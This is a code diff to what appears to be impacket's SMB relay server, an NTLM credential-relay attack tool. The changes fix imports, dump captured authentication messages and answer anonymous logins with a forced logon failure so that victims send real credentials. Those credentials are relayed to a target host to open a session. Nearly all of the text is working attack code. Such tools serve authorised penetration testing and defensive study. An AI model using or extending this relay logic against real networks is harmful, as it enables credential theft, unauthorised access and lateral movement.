@@ -40,8 +40,8 @@ from impacket import smbserver, smb, ntlm, dcerpc, version
 from impacket.dcerpc import dcerpc, transport, srvsvc, svcctl
 from impacket.examples import serviceinstall
 from impacket.spnego import *
-from smb import *
-from smbserver import *
+from impacket.smb import *
+from impacket.smbserver import *
 
 from threading import Thread
 
@@ -323,9 +323,14 @@ class SMBRelayServer:
                 # back to the target system and hope for the best.
                 smbClient = smbData[self.target]['SMBClient']
                 authData = sessionSetupData['SecurityBlob']
-                clientResponse, errorCode = smbClient.sendAuth(sessionSetupData['SecurityBlob'])                
                 authenticateMessage = ntlm.NTLMAuthChallengeResponse()
                 authenticateMessage.fromString(token)
+                authenticateMessage.dump()
+                if authenticateMessage['user_name'] != '':
+                    clientResponse, errorCode = smbClient.sendAuth(sessionSetupData['SecurityBlob'])                
+                else:
+                    # Anonymous login, send STATUS_LOGON_FAILURE so we force the client to send his credentials
+                    errorCode = STATUS_LOGON_FAILURE
 
                 if errorCode != STATUS_SUCCESS:
                     # Let's return what the target returned, hope the client connects back again
@@ -343,7 +348,7 @@ class SMBRelayServer:
                     # Reset the UID
                     smbClient.setUid(0)
                     print "[!] Authenticating against %s as %s\%s FAILED" % (connData['ClientIP'],authenticateMessage['domain_name'], authenticateMessage['user_name'])
-                    del (smbData[self.target])
+                    #del (smbData[self.target])
                     return None, [packet], errorCode
                 else:
                     # We have a session, create a thread and do whatever we want
